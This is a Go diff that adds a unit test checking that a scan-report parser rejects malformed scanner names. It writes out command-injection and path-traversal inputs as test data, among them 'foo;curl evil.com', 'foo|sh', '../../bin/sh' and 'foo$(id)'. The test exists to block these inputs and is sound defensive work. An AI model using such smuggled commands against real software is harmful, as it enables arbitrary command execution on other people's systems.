@@ -220,3 +220,40 @@ func TestTryParseScanReportWithNativeScanner(t *testing.T) {
 	assert.Len(t, result.OSUpdates, 1)
 	assert.Equal(t, "test-pkg", result.OSUpdates[0].Name)
 }
+
+func TestValidScannerNamePattern(t *testing.T) {
+	tests := []struct {
+		name    string
+		scanner string
+		wantErr bool
+	}{
+		{"valid simple name", "grype", false},
+		{"valid with hyphen", "my-scanner", false},
+		{"valid with underscore", "my_scanner", false},
+		{"valid with numbers", "scanner2", false},
+		{"invalid semicolon injection", "foo;curl evil.com", true},
+		{"invalid pipe injection", "foo|sh", true},
+		{"invalid path traversal", "../../bin/sh", true},
+		{"invalid space", "foo bar", true},
+		{"invalid backtick", "foo`id`", true},
+		{"invalid dollar", "foo$(id)", true},
+		{"empty string", "", true},
+		{"starts with hyphen", "-badname", true},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			_, err := customParseScanReport("testdata/trivy_valid.json", tt.scanner)
+			if tt.wantErr {
+				assert.Error(t, err)
+				if !validScannerNamePattern.MatchString(tt.scanner) {
+					assert.Contains(t, err.Error(), "invalid scanner name")
+				}
+			} else if err != nil {
+				// Valid scanner names pass validation but fail on exec (binary not found).
+				// Assert they are NOT rejected by validation.
+				assert.NotContains(t, err.Error(), "invalid scanner name")
+			}
+		})
+	}
+}
